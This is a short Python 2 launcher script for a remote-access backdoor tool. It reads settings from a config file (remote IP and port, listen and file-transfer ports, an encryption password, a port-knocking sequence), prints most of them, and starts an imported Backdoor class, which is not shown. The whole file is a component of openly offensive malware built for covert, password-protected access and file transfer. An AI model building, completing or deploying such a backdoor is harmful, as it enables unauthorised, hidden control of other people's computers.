import ConfigParser
from backdoor import Backdoor

def main():

    config = ConfigParser.ConfigParser()
    config.read('setup.config')

    localIP = config.get('Backdoor', 'localIP')
    localPort = config.get('Backdoor', 'localPort')
    remoteIP = config.get('Backdoor', 'remoteIP')
    remotePort = config.get('Backdoor', 'remotePort')
    protocol = config.get('General', 'protocol')
    password = config.get('Encryption', 'password')
    listenPort = config.get('General', 'listenPort')
    filePort = config.get('General', 'filePort')
    knockList = config.get('General', 'knockList')

    print(localIP, localPort, listenPort, remoteIP, remotePort, protocol, password)
    backdoor = Backdoor(localIP, localPort, listenPort, filePort, remoteIP, remotePort, protocol, password, knockList)
    backdoor.run()

if __name__ == '__main__':
    main()
